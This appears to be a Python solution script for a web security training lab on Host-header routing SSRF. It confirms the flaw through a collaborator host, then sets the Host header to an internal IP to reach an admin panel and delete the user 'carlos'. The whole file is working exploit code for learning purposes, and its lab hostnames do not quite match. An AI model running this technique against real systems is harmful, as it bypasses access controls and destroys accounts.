import http.client
import re
import ssl
import urllib.parse

LAB_ID = "???"
COLLABORATOR_URL = "???"


def GET(
        connection: http.client.HTTPSConnection,
        path: str,
        _lab: str | None = None,
        session: str | None = None,
        _host: str | None = None,
) -> http.client.HTTPResponse:
    method, path = 'GET', f'https://{host}{path}'
    headers = {}
    cookies = []
    if _lab:
        cookies.append(f'_lab={_lab}')
    if session:
        cookies.append(f'session={session}')
    if cookies:
        headers['cookie'] = "; ".join(cookies)
    if _host:
        headers['host'] = _host
    connection.request(method, path, '', headers)
    return connection.getresponse()


def POST_delete(
        connection: http.client.HTTPSConnection,
        _lab: str,
        session: str,
        _host: str,
        csrf: str,
) -> http.client.HTTPResponse:
    host, port = f'{LAB_ID}.web-security-academy.net', 443
    method, path = 'POST', f'https://{host}/admin/delete'
    headers = {
        'content-type': 'application/x-www-form-urlencoded',
    }
    cookies = []
    if _lab:
        cookies.append(f'_lab={_lab}')
    if session:
        cookies.append(f'session={session}')
    if cookies:
        headers['cookie'] = "; ".join(cookies)
    if _host:
        headers['host'] = _host
    fields = {
        'csrf': csrf,
        'username': 'carlos',
    }
    body = urllib.parse.urlencode(fields)
    headers['content-length'] = str(len(body))
    connection.request(method, path, body, headers)
    return connection.getresponse()


def extract_csrf(body: str) -> str:
    return re.findall(r'name="csrf" value="([a-zA-Z0-9]+)"', body)[0]


def extract_session(response: http.client.HTTPResponse) -> str:
    cookie_header = response.getheader('set-cookie')
    return re.findall(r'session=([a-zA-Z0-9]+);', cookie_header)[0]


def extract_lab(response: http.client.HTTPResponse) -> str:
    cookie_header = response.getheader('set-cookie')
    return re.findall(r'_lab=([%a-zA-Z0-9]+);', cookie_header)[0]


def lab_cookies() -> tuple[str, str]:
    connection = http.client.HTTPSConnection(host, port, context=ssl._create_unverified_context())
    response = GET(path="/", connection=connection)
    return extract_lab(response), extract_session(response)


host, port = f'{LAB_ID}.h1-web-security-academy.net', 443
connection = http.client.HTTPSConnection(host, port, context=ssl._create_unverified_context())

_lab, session = lab_cookies()
print(f"_lab: {_lab}")
print(f"session: {session}")
response = GET(connection=connection, path="/admin", _lab=_lab, session=session)
response.read()
response = GET(connection=connection, path="/admin", _host=COLLABORATOR_URL, _lab=_lab, session=session)
print(response.status)
for name, header in response.headers.items():
    print(f"{name}: {header}")
response_body = response.read().decode()
print(response_body)
if response.status != 200 or not response.headers['server'] or 'collaborator' not in response.headers['server']:
    print("host header authentication not confirmed")
    exit(1)
print("host header authentication confirmed")
print()

admin_ip = '192.168.0.1'
response = GET(connection=connection, path="/admin", _lab=_lab, session=session)
response.read()
response = GET(connection=connection, path="/admin", _host=admin_ip, _lab=_lab, session=session)

print(f"admin panel server response:")
print(response.status)
for name, header in response.headers.items():
    print(f"{name}: {header}")
response_body = response.read().decode()
print(response_body)
print()

print("deleting user carlos")
csrf = extract_csrf(response_body)
print(f"csrf: {csrf}")
print(f"session: {session}")
response = POST_delete(connection=connection, session=session, _lab=_lab, _host=admin_ip, csrf=csrf)
print(response.status)
for name, header in response.headers.items():
    print(f"{name}: {header}")
response_body = response.read().decode()
print(response_body)
